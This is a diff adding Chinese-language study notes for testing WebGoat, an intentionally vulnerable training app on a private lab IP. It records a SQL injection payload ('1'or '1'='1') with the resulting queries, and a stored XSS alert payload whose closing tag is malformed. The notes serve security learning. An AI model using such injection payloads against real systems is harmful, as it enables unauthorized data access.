@@ -18,3 +18,15 @@
 
 ## 檢查HTTPs
 - https://check.twnic.tw/
+
+# 測試IP
+- http://192.168.33.75:8080/WebGoat/login.mvc
+- 登入
+#### 測試1:String SQL Injection
+- String SQL Injection
+- 攻擊的Payload == > 1'or '1'='1
+- SELECT * FROM user_data WHERE last_name = '    '
+- SELECT * FROM user_data WHERE last_name = '1'or '1'='1'
+- SELECT * FROM user_data
+#### 測試2:Stored XSS Attacks
+- 攻擊的Payload == >  <script>alert(`XSS Hacking`)<script/>
